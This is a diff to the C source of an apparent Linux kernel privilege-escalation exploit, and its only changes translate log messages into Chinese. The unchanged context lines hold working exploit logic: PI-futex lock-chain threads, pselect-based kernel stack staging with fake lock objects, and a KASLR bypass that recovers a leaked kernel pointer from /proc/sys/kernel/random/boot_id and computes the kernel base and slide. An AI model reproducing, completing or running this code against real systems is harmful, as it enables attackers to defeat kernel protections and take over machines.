@@ -87,7 +87,7 @@ void slide_pselect_put_waiter_word(
   int placed = slide_pselect_put_global_word(
       in, out, ex, words_per_set, global_word, value);
   if (!placed) {
-    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
+    pr_warning("slide pselect无法放置 %s waiter_word=%d global_word=%d "
                "words_per_set=%d nfds=%d\n",
                name, waiter_word, global_word, words_per_set,
                SLIDE_PSELECT_NFDS);
@@ -138,7 +138,7 @@ void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
 
 void slide_pselect_stack_copy(void) {
   if (!page_base || !fake_lock || !fake_w0) {
-    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
+    pr_error("slide pselect缺失内核页 base=%016zx lock=%016zx w0=%016zx\n",
              page_base, fake_lock, fake_w0);
     return;
   }
@@ -147,13 +147,13 @@ void slide_pselect_stack_copy(void) {
   SYSCHK(pipe(pipefd));
   int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
   if (block_fd < 0) {
-    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
+    pr_warning("slide timerfd_create失败 errno=%d; 使用pipe读端\n",
                errno);
     block_fd = pipefd[0];
   }
   int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
   if (high_read < 0) {
-    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
+    pr_error("slide pselect F_DUPFD读取错误 errno=%d\n", errno);
     if (block_fd != pipefd[0]) {
       close(block_fd);
     }
@@ -190,7 +190,7 @@ void slide_pselect_stack_copy(void) {
   int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
   atomic_store(&slide_consume_go, 0);
-  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
+  pr_info("slide pselect返回 ret=%d errno=%d calls=%d sched_ok=%d "
           "last_sched_ret=%d last_sched_errno=%d\n",
           ret, saved_errno, atomic_load(&slide_consume_calls),
           atomic_load(&slide_consume_sched_ok),
@@ -266,7 +266,7 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   atomic_store(&slide_waiter_tid, tid);
 
   if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
-    pr_error("slide waiter lock chain errno=%d\n", errno);
+    pr_error("slide等待者锁链错误 errno=%d\n", errno);
     return NULL;
   }
 
@@ -294,7 +294,7 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
 
 void *slide_owner_thread(void *arg __attribute__((unused))) {
   if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
-    pr_error("slide owner lock target errno=%d\n", errno);
+    pr_error("slide持有者锁目标错误 errno=%d\n", errno);
     return NULL;
   }
 
@@ -328,7 +328,7 @@ uint64_t slide_read_stext(void) {
   unsigned char raw[16];
   int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
   if (fd < 0) {
-    pr_warning("slide boot_id read denied errno=%d\n", errno);
+    pr_warning("slide boot_id读取被拒绝 errno=%d\n", errno);
     return 0;
   }
 
@@ -336,7 +336,7 @@ uint64_t slide_read_stext(void) {
   int saved_errno = errno;
   close(fd);
   if (n < 0) {
-    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
+    pr_warning("slide boot_id读取失败 errno=%d\n", saved_errno);
     return 0;
   }
   buf[n] = 0;
@@ -356,7 +356,7 @@ uint64_t slide_read_stext(void) {
     nibble = -1;
   }
   if (out != 16) {
-    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
+    pr_warning("slide boot_id解析过短 out=%d n=%zd\n", out, n);
     return 0;
   }
 
@@ -365,16 +365,16 @@ uint64_t slide_read_stext(void) {
     leaked |= (uint64_t)raw[i] << (i * 8);
   }
   if ((leaked >> 48) != 0xffff) {
-    pr_warning("slide bad leaked pointer=%016llx\n",
+    pr_warning("slide错误泄露指针=%016llx\n",
                (unsigned long long)leaked);
     return 0;
   }
 
   uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
   uint64_t stext = leaked - off;
-  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
+  pr_success("slide boot_id泄露nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
              getpid(), (unsigned long long)leaked, (unsigned long long)stext);
-  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
+  pr_success("slide boot_id衍生stext pid=%d value=%016llx\n",
              getpid(), (unsigned long long)stext);
   return stext;
 }
@@ -438,7 +438,7 @@ int slide_leak_kernel_base(void) {
     SYSCHK(waitpid(child, &status, 0));
     if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
         WEXITSTATUS(status) != 0 || !stext) {
-      pr_warning("slide attempt %d failed n=%zd status=%d\n",
+      pr_warning("slide尝试 %d 失败 n=%zd status=%d\n",
                  attempt, n, status);
       continue;
     }
@@ -446,7 +446,7 @@ int slide_leak_kernel_base(void) {
     kaslr_base = stext;
     kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
     kaslr_done = 1;
-    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
+    pr_success("slide-kaslr成功 pid=%d base=%016llx slide=%016llx\n",
                getpid(), (unsigned long long)kaslr_base,
                (unsigned long long)kaslr_slide);
     return 1;
